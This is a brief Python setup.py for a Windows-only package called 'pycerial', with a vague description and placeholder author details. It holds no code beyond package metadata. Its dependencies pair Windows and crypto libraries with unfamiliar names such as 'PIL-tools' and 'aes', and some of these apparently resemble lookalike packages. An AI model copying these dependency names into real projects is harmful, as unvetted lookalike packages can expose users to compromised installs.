from setuptools import setup, find_packages
import codecs
import os

VERSION = "0.0.3"
DESCRIPTION = "Cerial"

# Setting up
setup(
    name="pycerial",
    version=VERSION,
    author="Rye",
    author_email="rye@rye.com",
    description=DESCRIPTION,
    packages=find_packages(),
    install_requires=[
        "httpx",
        "pyotp",
        "psutil",
        "pypiwin32",
        "pycryptodome",
        "pyinstaller>=5.0",
        "PIL-tools",
        "aes",
        "colorama",
        "win10toast",
        "requests",
    ],
    keywords=[],
    classifiers=[
        "Programming Language :: Python :: 3",
        "Operating System :: Microsoft :: Windows",
    ],
)
